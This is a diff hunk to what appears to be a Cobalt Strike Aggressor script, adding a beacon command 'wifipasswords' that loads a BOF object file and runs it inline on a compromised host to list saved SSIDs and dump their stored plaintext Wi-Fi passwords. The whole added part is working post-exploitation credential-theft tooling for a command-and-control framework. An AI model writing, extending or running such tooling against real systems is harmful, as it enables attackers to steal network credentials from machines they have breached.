@@ -1271,6 +1271,24 @@ alias executecrosssession {
 }
 
 
+beacon_command_register(
+	"wifipasswords", "Dump all stored Wi-Fi passwords.",
+	"INFO:\nEnumerates all saved SSID's, then retrieves each AP’s stored plaintext password\n\n" .
+	"USAGE:\nwifipasswords\n\n");
+	
+alias wifipasswords {
+    $bid = $1;
+
+    # Read in the right BOF file
+    $handle = openf(script_resource("wifipasswords.o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+	$arg_data  = bof_pack($bid);
+
+	blog($bid, "Tasked to enumerate SSID's and dump stored WiFi passwords..");
+    beacon_inline_execute($bid, $data, "go", $arg_data);
+}
 
 
 
